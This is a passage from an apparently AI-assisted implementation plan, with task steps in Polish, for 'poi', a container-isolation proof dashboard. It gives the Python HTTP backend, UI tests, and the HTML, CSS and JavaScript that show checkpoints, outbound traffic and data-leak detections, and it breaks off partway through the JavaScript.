                return None
            row = self._event_row(ev)
            cp = res.checkpoints[ev.checkpoint]
            row["proof"] = {"checkpoint": ev.checkpoint, "checkpoint_t": cp["t"],
                            "egress_accumulator": cp["egress"]["digest"], "signature": "verified",
                            "element": c.encode(*ev.fields).decode("utf-8").replace("\0", " │ ")}
            if ev.domain == "egress":
                f = ev.fields
                hdr = self._evidence(f[6])
                body = self._evidence(f[7])
                row["headers"] = json.loads(hdr) if hdr else None
                row["body"] = preview(body)
                if body is not None and f[3] != "CONNECT":
                    d = self.m.policy.decide(f[4], f[3], f[5], body)
                    row["policy_recheck"] = {"verdict": d.verdict, "reason": d.reason}
                ing = next((e for e in res.ingress if e.seq == seq), None)
                if ing is not None:
                    ih = self._evidence(ing.fields[3])
                    row["response"] = {"status": int(ing.fields[2]),
                                       "headers": json.loads(ih) if ih else None,
                                       "body": preview(self._evidence(ing.fields[4]))}
            return row

    def checkpoint(self, seq: int) -> dict | None:
        with self.m.lock:
            res = self.m.verifier.res
            if not 0 <= seq < len(res.checkpoints):
                return None
            cp = res.checkpoints[seq]
            s = self._cp_stats(seq)
            prev_cfg = None
            for prev in range(seq - 1, -1, -1):
                if (pc := self._cp_stats(prev)["config"]) is not None:
                    prev_cfg = pc
                    break
            config = None
            if s["config"] is not None:
                after = self._evidence(s["config"])
                before = self._evidence(prev_cfg) if prev_cfg else None
                config = {"before": json.loads(before) if before else None,
                          "after": json.loads(after) if after else None}
            return {"seq": seq, "t": cp["t"], "prev": cp["prev"], "delta": cp["delta"], "policy": cp["policy"],
                    "state": cp["state"]["digest"], "egress": cp["egress"]["digest"],
                    "ingress": cp["ingress"]["digest"], "egress_count": cp["egress"]["count"],
                    "ingress_count": cp["ingress"]["count"], "restart": cp.get("restart", False),
                    "rotate": cp.get("rotate"), "signature": "verified", "files": s["files"],
                    "config_change": config,
                    "events": [e.seq for e in res.egress if e.checkpoint == seq]}


def make_dashboard_server(app: DashboardApp, session_key: str, host: str = "127.0.0.1",
                          port: int = 8780) -> ThreadingHTTPServer:
    static_dir = resources.files("poi") / "dashboard_static"
    cookie = f"poi_session={session_key}"

    class Handler(BaseHTTPRequestHandler):
        server_version = "poi-dashboard"

        def log_message(self, *args) -> None:
            pass

        def _authed(self, url) -> bool:
            q = parse_qs(url.query).get("key", [""])[0]
            cookies = [x.strip() for x in (self.headers.get("cookie") or "").split(";")]
            return hmac.compare_digest(q, session_key) or any(hmac.compare_digest(x, cookie) for x in cookies)

        def _headers(self, code: int, ctype: str, length: int | None = None, extra=()) -> None:
            self.send_response(code)
            self.send_header("content-type", ctype)
            self.send_header("content-security-policy", CSP)
            self.send_header("x-content-type-options", "nosniff")
            self.send_header("cache-control", "no-store")
            for k, v in extra:
                self.send_header(k, v)
            if length is not None:
                self.send_header("content-length", str(length))
            self.end_headers()

        def _json(self, obj, code: int = 200) -> None:
            body = json.dumps(obj).encode()
            self._headers(code, "application/json", len(body))
            self.wfile.write(body)

        def do_GET(self) -> None:
            url = urlsplit(self.path)
            if not self._authed(url):
                return self._json({"error": "missing or wrong session key"}, 403)
            if url.path in STATIC:
                name, ctype = STATIC[url.path]
                body = (static_dir / name).read_bytes()
                extra = [("set-cookie", f"{cookie}; HttpOnly; SameSite=Strict; Path=/")] if url.path == "/" else []
                self._headers(200, ctype, len(body), extra)
                return self.wfile.write(body)
            q = parse_qs(url.query)
            parts = url.path.strip("/").split("/")
            if url.path == "/api/summary":
                return self._json(app.summary())
            if url.path == "/api/events":
                before = q.get("before", [None])[0]
                kind = q.get("kind", ["all"])[0]
                try:
                    limit = min(int(q.get("limit", ["100"])[0]), 500)
                    before_i = int(before) if before else None
                except ValueError:
                    return self._json({"error": "bad query"}, 400)
                return self._json(app.events(before_i, limit, kind))
            if len(parts) == 3 and parts[:2] in (["api", "event"], ["api", "checkpoint"]) and _NUM.match(parts[2]):
                obj = (app.event if parts[1] == "event" else app.checkpoint)(int(parts[2]))
                return self._json(obj) if obj is not None else self._json({"error": "not found"}, 404)
            if url.path == "/api/stream":
                return self._stream()
            return self._json({"error": "not found"}, 404)

        def do_POST(self) -> None:
            url = urlsplit(self.path)
            if not self._authed(url) or self.headers.get("x-poi") != "1":
                return self._json({"error": "forbidden"}, 403)
            parts = url.path.strip("/").split("/")
            if len(parts) == 3 and parts[:2] == ["api", "ack"] and _NUM.match(parts[2]):
                ok = app.m.ack(int(parts[2]))
                return self._json({"ok": ok}, 200 if ok else 404)
            return self._json({"error": "not found"}, 404)

        def _stream(self) -> None:
            self._headers(200, "text/event-stream")
            m = app.m
            seen = -1
            try:
                while True:
                    with m.lock:
                        if m.version == seen:
                            m.changed.wait(timeout=2.0)       # heartbeat keeps ages and staleness fresh
                        seen = m.version
                    data = json.dumps(app.summary())
                    self.wfile.write(f"event: update\ndata: {data}\n\n".encode())
                    self.wfile.flush()
            except (BrokenPipeError, ConnectionResetError):
                return

    srv = ThreadingHTTPServer((host, port), Handler)
    srv.daemon_threads = True
    return srv


def new_session_key() -> str:
    return secrets.token_urlsafe(24)


def serve_in_background(srv: ThreadingHTTPServer) -> threading.Thread:
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return t
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_dashboard.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/dashboard.py tests/helpers.py tests/test_dashboard.py
git commit -m "feat: dashboard backend with session key, inspector API and SSE

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 6: Interfejs dashboardu (EN)

Strona: pieczęć werdyktu z odciskiem stanu, kafelki, taśma łańcucha dowodowego, ruch wychodzący, panel deklaracji operatora, inspektor; bez zasobów zewnętrznych, bez `innerHTML`.

**Files:**
- Create: `src/poi/dashboard_static/index.html`
- Create: `src/poi/dashboard_static/app.css`
- Create: `src/poi/dashboard_static/app.js`
- Test: `tests/test_dashboard_ui.py`

**Interfaces:**
- Consumes: API z zadania 5 (`/api/summary`, `/api/events`, `/api/event/{seq}`, `/api/checkpoint/{seq}`, `POST /api/ack/{seq}` z nagłówkiem `x-poi: 1`, `/api/stream`)
- Produces: — (warstwa prezentacji)

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_dashboard_ui.py`:

```python
from importlib import resources

import pytest

from helpers import DASH_KEY as KEY, http_call as call, start_dashboard


@pytest.fixture
def dash(tmp_path, key):
    app, base, srv = start_dashboard(tmp_path, key)
    yield app, base
    srv.shutdown()


def test_page_sets_session_cookie_and_csp(dash):
    _, base = dash
    code, headers, body = call(base + f"/?key={KEY}")
    assert code == 200 and b"Chain of custody" in body
    assert "HttpOnly" in headers["Set-Cookie"] and "SameSite=Strict" in headers["Set-Cookie"]
    assert headers["Content-Security-Policy"].startswith("default-src 'self'")
    for asset, ctype in (("/app.js", "text/javascript"), ("/app.css", "text/css")):
        code, headers, _ = call(base + asset, headers={"cookie": f"poi_session={KEY}"})
        assert code == 200 and headers["Content-Type"].startswith(ctype)


def test_static_js_never_parses_html():
    js = (resources.files("poi") / "dashboard_static" / "app.js").read_text()
    for banned in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval(", 'setAttribute("style"'):
        assert banned not in js, banned


def test_page_loads_no_external_resources():
    html = (resources.files("poi") / "dashboard_static" / "index.html").read_text()
    assert "http://" not in html and "https://" not in html
    assert "<script>" not in html                      # no inline script: CSP forbids it
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_dashboard_ui.py -v`
Expected: FAIL — `FileNotFoundError` dla `dashboard_static/index.html` / `app.js`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/dashboard_static/index.html`:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>poi · isolation proof</title>
  <link rel="stylesheet" href="/app.css">
  <script src="/app.js" defer></script>
</head>
<body>
  <header class="bar">
    <div class="brand"><span class="mark">poi</span><span class="sub">Proof of isolation</span></div>
    <div class="source" id="source"></div>
    <button class="ghost" id="alerts" type="button">Turn on alerts</button>
  </header>

  <main>
    <section class="verdict" id="verdict" data-level="pending" aria-live="polite">
      <svg class="seal" id="seal" viewBox="0 0 200 200" role="img" aria-label="Verification seal"></svg>
      <div class="verdict-text">
        <p class="eyebrow">Your data, as verified on this computer</p>
        <h1 id="verdict-word">Connecting…</h1>
        <p class="lede" id="verdict-lede">Fetching the operator's checkpoints.</p>
        <ul class="reasons" id="reasons"></ul>
        <p class="meta" id="last"></p>
      </div>
    </section>

    <section class="tiles" aria-label="Totals">
      <div class="tile"><span class="label">Requests sent</span><span class="value" id="t-sent">–</span><span class="note">all within policy</span></div>
      <div class="tile"><span class="label">Attempts blocked</span><span class="value" id="t-blocked">–</span><span class="note" id="t-dns"></span></div>
      <div class="tile"><span class="label">Your data found in traffic</span><span class="value" id="t-hits">–</span><span class="note" id="t-hits-note"></span></div>
      <div class="tile"><span class="label">Covert channel limit</span><span class="value" id="t-cap">–</span><span class="note">upper bound across all sent requests</span></div>
    </section>

    <section class="custody">
      <div class="section-head">
        <h2>Chain of custody</h2>
        <p class="hint">One link per signed checkpoint. Select a link to see what changed.</p>
      </div>
      <div class="tape" id="tape" role="list"></div>
    </section>

    <div class="lower">
      <section class="feed">
        <div class="section-head">
          <h2>Outbound traffic</h2>
          <div class="filters" role="group" aria-label="Filter traffic">
            <button type="button" data-kind="all" aria-pressed="true">All</button>
            <button type="button" data-kind="allowed" aria-pressed="false">Sent</button>
            <button type="button" data-kind="blocked" aria-pressed="false">Blocked</button>
            <button type="button" data-kind="dns" aria-pressed="false">DNS</button>
          </div>
        </div>
        <ol class="events" id="events"></ol>
        <p class="empty" id="events-empty" hidden>No outbound traffic yet. Every request the container makes will appear here.</p>
      </section>

      <aside class="operator" aria-labelledby="op-title">
        <h2 id="op-title">Operator says</h2>
        <p class="caveat">Reported by the operator's server. This cannot be verified and never changes the verdict.</p>
        <dl id="operator"></dl>
      </aside>
    </div>
  </main>

  <aside class="drawer" id="drawer" aria-hidden="true" aria-labelledby="drawer-title">
    <div class="drawer-head">
      <h2 id="drawer-title">Details</h2>
      <button class="ghost" id="drawer-close" type="button">Close</button>
    </div>
    <div class="drawer-body" id="drawer-body"></div>
  </aside>
  <div class="toast" id="toast" role="status" hidden></div>
</body>
</html>
```

Utwórz `src/poi/dashboard_static/app.css`:

```css
:root {
  --paper: #eef1f4;
  --surface: #ffffff;
  --ink: #14202b;
  --muted: #5b6b79;
  --rule: #d5dce3;
  --cobalt: #3150c4;
  --ok: #2f7d5b;
  --warn: #b8720f;
  --bad: #b3261e;
  --pending: #8291a0;
  --mono: ui-monospace, "SF Mono", "JetBrains Mono", "Cascadia Mono", Menlo, Consolas, monospace;
  --sans: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  color-scheme: light dark;
}
@media (prefers-color-scheme: dark) {
  :root {
    --paper: #0f151b; --surface: #17202a; --ink: #e4eaf0; --muted: #93a3b3; --rule: #2a3643;
    --cobalt: #8ea2ff; --ok: #4fb386; --warn: #e2a13f; --bad: #f0675e; --pending: #6f7f8f;
  }
}

* { box-sizing: border-box; }
html, body { margin: 0; background: var(--paper); color: var(--ink); font: 15px/1.5 var(--sans); }
h1, h2, p, dl, ol, ul { margin: 0; }
button { font: inherit; color: inherit; }
:focus-visible { outline: 2px solid var(--cobalt); outline-offset: 2px; }

.bar { display: flex; align-items: center; gap: 16px; padding: 14px 28px; border-bottom: 1px solid var(--rule); }
.brand { display: flex; align-items: baseline; gap: 10px; }
.mark { font: 700 20px/1 var(--mono); letter-spacing: -0.02em; }
.sub { color: var(--muted); font-size: 13px; }
.source { margin-left: auto; font: 12px var(--mono); color: var(--muted); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.ghost { background: none; border: 1px solid var(--rule); border-radius: 6px; padding: 6px 12px; cursor: pointer; }
.ghost:hover { border-color: var(--muted); }

main { max-width: 1180px; margin: 0 auto; padding: 28px; display: grid; gap: 28px; }

/* verdict + seal (signature) */
.verdict { --level: var(--pending); display: grid; grid-template-columns: 200px 1fr; gap: 32px; align-items: center; }
.verdict[data-level="verified"] { --level: var(--ok); }
.verdict[data-level="attention"] { --level: var(--warn); }
.verdict[data-level="broken"] { --level: var(--bad); }
.seal { width: 200px; height: 200px; color: var(--level); }
.seal .ring { fill: none; stroke: currentColor; }
.seal .ring-text { fill: currentColor; font: 600 8.6px var(--mono); letter-spacing: 0.06em; }
.seal .core { fill: currentColor; }
.seal .glyph { fill: none; stroke: var(--surface); stroke-width: 7; stroke-linecap: round; stroke-linejoin: round; }
.seal.stamp { animation: stamp 420ms cubic-bezier(.2,.9,.3,1.2); }
@keyframes stamp { from { transform: scale(1.12) rotate(-6deg); opacity: .4; } to { transform: none; opacity: 1; } }
@media (prefers-reduced-motion: reduce) { .seal.stamp { animation: none; } }

.eyebrow { font: 600 11px var(--mono); text-transform: uppercase; letter-spacing: .12em; color: var(--muted); }
.verdict h1 { font: 800 clamp(34px, 5vw, 54px)/1.05 var(--sans); letter-spacing: -0.03em; color: var(--level); margin: 6px 0 8px; }
.lede { font-size: 17px; max-width: 60ch; }
.reasons { list-style: none; padding: 0; margin-top: 10px; display: grid; gap: 6px; }
.reasons li { border-left: 3px solid var(--level); padding: 2px 0 2px 10px; }
.meta { margin-top: 12px; font: 12px var(--mono); color: var(--muted); }

/* tiles */
.tiles { display: grid; grid-template-columns: repeat(4, 1fr); border: 1px solid var(--rule); border-radius: 10px; background: var(--surface); }
.tile { padding: 16px 18px; display: grid; gap: 2px; }
.tile + .tile { border-left: 1px solid var(--rule); }
.label { font-size: 13px; color: var(--muted); }
.value { font: 600 28px/1.2 var(--mono); letter-spacing: -0.02em; }
.value.bad { color: var(--bad); }
.value.warn { color: var(--warn); }
.note { font-size: 12px; color: var(--muted); }

/* chain of custody tape */
.section-head { display: flex; align-items: baseline; justify-content: space-between; gap: 16px; margin-bottom: 10px; flex-wrap: wrap; }
h2 { font: 700 15px var(--sans); }
.hint { font-size: 13px; color: var(--muted); }
.tape { display: flex; align-items: flex-end; gap: 3px; height: 74px; padding: 10px; overflow-x: auto;
        background: repeating-linear-gradient(90deg, transparent 0 7px, var(--rule) 7px 8px), var(--surface);
        border: 1px solid var(--rule); border-radius: 10px; }
.link { flex: 0 0 10px; min-height: 14px; border: 0; border-radius: 3px; padding: 0; cursor: pointer; background: var(--ok); opacity: .85; }
.link:hover, .link:focus-visible { opacity: 1; transform: translateY(-2px); }
.link.hit { background: var(--warn); }
.link.config { box-shadow: inset 0 3px 0 var(--cobalt); }
.link.failed { background: var(--bad); }

/* feed */
.lower { display: grid; grid-template-columns: 1fr 300px; gap: 28px; align-items: start; }
.filters { display: flex; gap: 4px; }
.filters button { background: none; border: 1px solid var(--rule); border-radius: 999px; padding: 3px 12px; cursor: pointer; font-size: 13px; }
.filters button[aria-pressed="true"] { background: var(--ink); color: var(--paper); border-color: var(--ink); }
.events { list-style: none; padding: 0; border: 1px solid var(--rule); border-radius: 10px; background: var(--surface); max-height: 460px; overflow-y: auto; }
.events:empty { display: none; }
.ev { display: grid; grid-template-columns: 74px 64px 1fr auto; gap: 12px; align-items: center; width: 100%;
      padding: 9px 14px; border: 0; border-bottom: 1px solid var(--rule); background: none; text-align: left; cursor: pointer; }
.events li:last-child .ev { border-bottom: 0; }
.ev:hover { background: color-mix(in srgb, var(--cobalt) 6%, transparent); }
.ev .time { font: 12px var(--mono); color: var(--muted); }
.ev .tag { font: 600 11px var(--mono); text-transform: uppercase; letter-spacing: .06em; }
.ev .tag.allow { color: var(--ok); }
.ev .tag.block { color: var(--bad); }
.ev .target { font: 13px var(--mono); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.ev .why { font-size: 12px; color: var(--muted); }
.badge { font: 600 11px var(--sans); color: var(--warn); border: 1px solid currentColor; border-radius: 999px; padding: 1px 8px; white-space: nowrap; }
.badge.acked { color: var(--muted); }
.empty { color: var(--muted); padding: 18px; border: 1px dashed var(--rule); border-radius: 10px; }

.operator { background: var(--surface); border: 1px dashed var(--rule); border-radius: 10px; padding: 16px; color: var(--muted); }
.operator h2 { color: var(--ink); }
.caveat { font-size: 12px; margin: 4px 0 12px; }
.operator dl { display: grid; grid-template-columns: auto 1fr; gap: 6px 12px; font-size: 13px; }
.operator dd { margin: 0; font-family: var(--mono); color: var(--ink); text-align: right; }

/* drawer (inspector) */
.drawer { position: fixed; inset: 0 0 0 auto; width: min(560px, 100vw); background: var(--surface); border-left: 1px solid var(--rule);
          transform: translateX(100%); visibility: hidden; transition: transform 200ms ease, visibility 0s 200ms;
          display: flex; flex-direction: column; box-shadow: -12px 0 32px rgb(0 0 0 / .12); }
.drawer[aria-hidden="false"] { transform: none; visibility: visible; transition: transform 200ms ease; }
@media (prefers-reduced-motion: reduce) { .drawer { transition: none; } }
.drawer-head { display: flex; justify-content: space-between; align-items: center; padding: 16px 20px; border-bottom: 1px solid var(--rule); }
.drawer-body { padding: 20px; overflow-y: auto; display: grid; gap: 18px; }
.kv { display: grid; grid-template-columns: 140px 1fr; gap: 6px 12px; font-size: 13px; }
.kv dt { color: var(--muted); }
.kv dd { margin: 0; font-family: var(--mono); word-break: break-all; }
.block-title { font: 600 11px var(--mono); text-transform: uppercase; letter-spacing: .1em; color: var(--muted); margin-bottom: 6px; }
pre { margin: 0; padding: 12px; background: var(--paper); border: 1px solid var(--rule); border-radius: 8px; font: 12px/1.5 var(--mono);
      white-space: pre-wrap; word-break: break-all; max-height: 320px; overflow: auto; }
.callout { border-left: 3px solid var(--warn); padding: 8px 12px; background: color-mix(in srgb, var(--warn) 10%, transparent); border-radius: 0 8px 8px 0; }
.callout.bad { border-color: var(--bad); background: color-mix(in srgb, var(--bad) 10%, transparent); }
.primary { background: var(--ink); color: var(--paper); border: 0; border-radius: 6px; padding: 8px 14px; cursor: pointer; justify-self: start; }
.paths { margin: 0; padding-left: 18px; font: 12px var(--mono); }

.toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--ink); color: var(--paper); padding: 8px 16px; border-radius: 8px; font-size: 14px; }

@media (max-width: 860px) {
  main { padding: 16px; }
  .bar { padding: 12px 16px; flex-wrap: wrap; }
  .verdict { grid-template-columns: 1fr; justify-items: start; }
  .seal { width: 140px; height: 140px; }
  .tiles { grid-template-columns: 1fr 1fr; }
  .tile:nth-child(3) { border-left: 0; }
  .tile:nth-child(n+3) { border-top: 1px solid var(--rule); }
  .lower { grid-template-columns: 1fr; }
  .ev { grid-template-columns: 64px 1fr; }
  .ev .time { grid-row: span 2; }
}
```

Utwórz `src/poi/dashboard_static/app.js`:

```javascript
// poi dashboard. All data from the run (bodies, paths, hosts) can be attacker-controlled:
// it is only ever inserted with textContent / createTextNode, never parsed as HTML.
"use strict";

const SVG = "http://www.w3.org/2000/svg";
const $ = (id) => document.getElementById(id);
const state = { kind: "all", summary: null, level: null, eventsVersion: -1 };

function el(tag, attrs = {}, ...children) {
  const node = document.createElement(tag);
  for (const [k, v] of Object.entries(attrs)) {
    if (k === "class") node.className = v;
    else if (k.startsWith("on")) node.addEventListener(k.slice(2), v);
    else node.setAttribute(k, v);
  }
  for (const c of children.flat()) {
    if (c === null || c === undefined || c === false) continue;
    node.append(c instanceof Node ? c : document.createTextNode(String(c)));
  }
  return node;
}

function svg(tag, attrs = {}, text) {
  const node = document.createElementNS(SVG, tag);
  for (const [k, v] of Object.entries(attrs)) node.setAttribute(k, v);
  if (text !== undefined) node.textContent = text;
  return node;
}

async function api(path, opts) {
  const r = await fetch(path, { credentials: "same-origin", ...opts });
  if (!r.ok) throw new Error(`${r.status} ${path}`);
  return r.json();
}

const WORDS = {
  verified: ["Verified", "Nothing left the container except requests your policy allows."],
  attention: ["Needs attention", "The proof still holds, but something needs your attention."],
  broken: ["Proof broken", "This run can no longer be trusted. The evidence is kept on this computer."],
  pending: ["Connecting…", "Fetching the operator's checkpoints."],
};
const GLYPH = { verified: "M70 102 L92 124 L132 80", attention: "M100 72 L100 108 M100 128 L100 130",
                broken: "M78 78 L122 122 M122 78 L78 122", pending: "M80 100 L120 100" };

function age(s) {
  if (s === null || s === undefined) return "never";
  if (s < 60) return `${Math.round(s)} s ago`;
  if (s < 3600) return `${Math.round(s / 60)} min ago`;
  return `${(s / 3600).toFixed(1)} h ago`;
}

function drawSeal(level, sum) {
  const seal = $("seal");
  seal.replaceChildren();
  const digest = sum && sum.last_checkpoint ? sum.last_checkpoint.state : "";
  const seq = sum && sum.last_checkpoint ? sum.last_checkpoint.seq : "–";
  const ring = `CHECKPOINT ${seq} · STATE ${digest.slice(0, 32)} · ${digest.slice(32)} · `;
  const defs = svg("defs");
  defs.append(svg("path", { id: "ring", d: "M100,100 m-82,0 a82,82 0 1,1 164,0 a82,82 0 1,1 -164,0" }));
  seal.append(defs,
    svg("circle", { class: "ring", cx: 100, cy: 100, r: 96, "stroke-width": 2 }),
    svg("circle", { class: "ring", cx: 100, cy: 100, r: 70, "stroke-width": 1 }));
  const text = svg("text", { class: "ring-text" });
  text.append(svg("textPath", { href: "#ring", textLength: 512 }, ring));
  seal.append(text, svg("circle", { class: "core", cx: 100, cy: 100, r: 62 }),
    svg("path", { class: "glyph", d: GLYPH[level] || GLYPH.pending }));
}

function renderSummary(sum) {
  state.summary = sum;
  const level = sum.verdict.level;
  const [word, lede] = WORDS[level] || WORDS.pending;
  $("verdict").dataset.level = level;
  $("verdict-word").textContent = word;
  $("verdict-lede").textContent = lede;
  $("reasons").replaceChildren(...sum.verdict.reasons.map((r) => el("li", {}, r)));
  const last = sum.last_checkpoint;
  $("last").textContent = last
    ? `Last signed checkpoint #${last.seq} · received ${age(last.age_s)} · operator clock ${last.t}`
    : "No checkpoint received yet.";
  drawSeal(level, sum);
  if (state.level !== null && state.level !== level) {
    $("seal").classList.remove("stamp"); void $("seal").getBBox(); $("seal").classList.add("stamp");
    notify(level, sum.verdict.reasons[0]);
  }
  state.level = level;
  document.title = (level === "verified" ? "" : "● ") + `poi · ${word}`;
  $("source").textContent = sum.source || "";

  $("t-sent").textContent = sum.sent;
  $("t-blocked").textContent = sum.blocked;
  $("t-dns").textContent = `${sum.dns} DNS lookups`;
  const hits = $("t-hits");
  hits.textContent = `${sum.hits_allowed} sent · ${sum.hits_blocked} blocked`;
  hits.className = "value" + (sum.hits_allowed ? " bad" : sum.hits_blocked ? " warn" : "");
  $("t-hits-note").textContent = sum.hits_allowed ? "your data left the container" : "checked with your private key";
  $("t-cap").textContent = sum.capacity_bits === null ? "unbounded" : `${Math.ceil(sum.capacity_bits)} bits`;
  $("t-cap").className = "value" + (sum.capacity_bits === null ? " warn" : "");

  renderTape(sum.timeline);
  renderOperator(sum.operator, sum.source_error);
  if (sum.version !== state.eventsVersion) {
    state.eventsVersion = sum.version;
    loadEvents();
  }
}

function renderTape(timeline) {
  const tape = $("tape");
  const max = Math.max(1, ...timeline.map((c) => (c.changes || 0) + (c.egress || 0)));
  tape.replaceChildren(...timeline.map((c) => {
    const h = 14 + Math.round(38 * ((c.changes || 0) + (c.egress || 0)) / max);
    const cls = ["link", c.failed ? "failed" : "", c.hit ? "hit" : "", c.config ? "config" : ""].join(" ");
    const label = c.failed ? `Checkpoint ${c.seq}: failed verification`
      : `Checkpoint ${c.seq} · ${c.t} · ${c.changes} file changes · ${c.egress} outbound events`;
    const link = el("button", { class: cls, type: "button", role: "listitem", title: label, "aria-label": label,
      onclick: () => c.failed ? null : openCheckpoint(c.seq) });
    link.style.height = `${h}px`;   // CSSOM, not a style attribute: allowed by the CSP
    return link;
  }));
  tape.scrollLeft = tape.scrollWidth;
}

function renderOperator(op, err) {
  const rows = [];
  const add = (k, v) => rows.push(el("dt", {}, k), el("dd", {}, v));
  if (err) add("Feed", `unreachable: ${err}`);
  if (!op) { add("Status", "not reported"); }
  else {
    add("Container", op.status || "unknown");
    if (op.started_at) add("Started", op.started_at.replace("T", " ").slice(0, 19));
    if (op.cpu_percent !== null && op.cpu_percent !== undefined) add("CPU", `${op.cpu_percent} %`);
    if (op.mem_bytes) add("Memory", `${(op.mem_bytes / 1048576).toFixed(1)} MiB`);
    if (op.observed_at) add("Reported at", op.observed_at.replace("T", " ").slice(0, 19));
  }
  $("operator").replaceChildren(...rows);
}

async function loadEvents() {
  const rows = await api(`/api/events?kind=${state.kind}&limit=200`);
  $("events").replaceChildren(...rows.map((r) => el("li", {},
    el("button", { class: "ev", type: "button", onclick: () => openEvent(r.seq) },
      el("span", { class: "time" }, r.t.slice(11, 19)),
      el("span", { class: `tag ${r.verdict}` }, r.kind === "dns" ? `dns ${r.verdict === "allow" ? "ok" : "no"}` : r.verdict === "allow" ? "sent" : "blocked"),
      el("span", {}, el("span", { class: "target" }, r.target), r.reason ? el("span", { class: "why" }, ` — ${r.reason}`) : null),
      r.hit ? el("span", { class: "badge" + (r.acked ? " acked" : "") }, r.acked ? "your data · seen" : "contains your data") : el("span")))));
  $("events-empty").hidden = rows.length > 0;
}

function kv(pairs) {
  return el("dl", { class: "kv" }, pairs.filter(Boolean).flatMap(([k, v]) => [el("dt", {}, k), el("dd", {}, v)]));
}

function bodyBlock(title, b) {
  if (!b) return null;
  const note = b.truncated ? ` (first 64 KB of ${b.size} bytes)` : ` (${b.size} bytes)`;
  return el("div", {}, el("p", { class: "block-title" }, title + note), el("pre", {}, b.text !== undefined ? b.text : b.hex));
}

function openDrawer(title, children) {
  $("drawer-title").textContent = title;
  $("drawer-body").replaceChildren(...children.filter(Boolean));
  $("drawer").setAttribute("aria-hidden", "false");
  $("drawer-close").focus();
}

async function openEvent(seq) {
  const e = await api(`/api/event/${seq}`);
  const sent = e.verdict === "allow";
  const parts = [];
  if (e.hit) {
    parts.push(el("div", { class: "callout" + (sent ? " bad" : "") },
      sent ? "Your data was found in a request that LEFT the container: " : "This blocked request contained your data: ",
      e.hit.join(", ")));
    if (!sent && !e.acked) parts.push(el("button", { class: "primary", type: "button", onclick: () => ack(seq) }, "Mark as seen"));
  }
  parts.push(kv([
    ["Event", `#${e.seq}`], ["Time (operator)", e.t],
    ["Outcome", sent ? "sent" : `blocked — ${e.reason}`],
    e.kind === "dns" ? ["DNS name", e.target] : ["Request", e.target],
    e.policy_recheck && ["Policy re-check here", e.policy_recheck.verdict === "allow" ? "passes the policy" : `fails: ${e.policy_recheck.reason}`],
  ]));
  if (e.headers) parts.push(el("div", {}, el("p", { class: "block-title" }, sent ? "Headers as sent" : "Headers the container tried to send"),
    el("pre", {}, e.headers.map(([k, v]) => `${k}: ${v}`).join("\n") || "(none)")));
  parts.push(bodyBlock(sent ? "Body as sent" : "Body the container tried to send", e.body));
  if (e.response) parts.push(el("div", {}, el("p", { class: "block-title" }, `Response · HTTP ${e.response.status}`)),
    bodyBlock("Response body", e.response.body));
  parts.push(el("div", {}, el("p", { class: "block-title" }, "Proof"), kv([
    ["Checkpoint", `#${e.proof.checkpoint} (${e.proof.checkpoint_t})`], ["Signature", e.proof.signature],
    ["Egress hash", e.proof.egress_accumulator], ["Element", e.proof.element]])));
  openDrawer(e.kind === "dns" ? `DNS lookup #${seq}` : `Request #${seq}`, parts);
}

async function openCheckpoint(seq) {
  const c = await api(`/api/checkpoint/${seq}`);
  const files = (title, list) => list.length ? el("div", {}, el("p", { class: "block-title" }, `${title} (${list.length})`),
    el("ul", { class: "paths" }, list.slice(0, 200).map((p) => el("li", {}, p)))) : null;
  const parts = [kv([
    ["Signed at (operator)", c.t], ["Signature", c.signature], ["Restart", c.restart ? "yes — operator daemon restarted" : "no"],
    ["State hash", c.state], ["Egress hash", `${c.egress} (${c.egress_count} events)`],
    ["Ingress hash", `${c.ingress} (${c.ingress_count})`], ["Previous", c.prev || "— genesis"],
    c.rotate && ["New signing key", c.rotate]]),
    files("Files added", c.files.added), files("Files changed", c.files.changed), files("Files removed", c.files.removed)];
  if (!c.files.added.length && !c.files.changed.length && !c.files.removed.length) parts.push(el("p", {}, "No file changes in this checkpoint."));
  if (c.config_change) parts.push(el("div", {}, el("p", { class: "block-title" }, seq === 0 ? "Container configuration" : "Container configuration changed"),
    el("pre", {}, JSON.stringify(c.config_change.after, null, 2))));
  if (c.events.length) parts.push(el("p", {}, `Outbound events in this checkpoint: ${c.events.map((s) => "#" + s).join(", ")}`));
  openDrawer(`Checkpoint #${seq}`, parts);
}

async function ack(seq) {
  await api(`/api/ack/${seq}`, { method: "POST", headers: { "x-poi": "1" } });
  toast("Marked as seen");
  openEvent(seq);
}

function toast(msg) {
  const t = $("toast");
  t.textContent = msg; t.hidden = false;
  clearTimeout(toast.timer); toast.timer = setTimeout(() => { t.hidden = true; }, 2200);
}

function notify(level, reason) {
  if (level === "verified" || !("Notification" in window) || Notification.permission !== "granted") return;
  new Notification(`poi: ${WORDS[level][0]}`, { body: reason || "" });
}

function connect() {
  api("/api/summary").then(renderSummary).catch((e) => { $("last").textContent = `Could not load the summary: ${e.message}`; });
  const es = new EventSource("/api/stream");
  es.addEventListener("update", (m) => renderSummary(JSON.parse(m.data)));
  es.onerror = () => { $("last").textContent = "Lost connection to the local dashboard — retrying…"; };
}

document.addEventListener("DOMContentLoaded", () => {
  history.replaceState(null, "", "/");
  document.querySelectorAll(".filters button").forEach((b) => b.addEventListener("click", () => {
    document.querySelectorAll(".filters button").forEach((x) => x.setAttribute("aria-pressed", String(x === b)));
    state.kind = b.dataset.kind; loadEvents();
  }));
  $("drawer-close").addEventListener("click", () => $("drawer").setAttribute("aria-hidden", "true"));
  document.addEventListener("keydown", (e) => { if (e.key === "Escape") $("drawer").setAttribute("aria-hidden", "true"); });
